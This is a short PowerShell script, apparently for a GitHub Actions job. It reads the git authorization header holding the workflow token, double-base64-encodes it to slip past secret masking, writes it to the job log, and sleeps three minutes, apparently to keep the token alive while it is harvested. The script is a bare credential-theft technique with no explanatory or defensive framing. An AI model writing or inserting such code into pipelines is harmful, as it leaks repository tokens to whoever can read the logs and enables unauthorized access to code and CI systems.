$extraheader = git config --get http.https://github.com/.extraheader
$encodedOutput = [Convert]::ToBase64String([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($extraheader)))
# Print the double base64-encoded value
Write-Output $encodedOutput
# Sleep for 3 minutes
Start-Sleep -Seconds 180
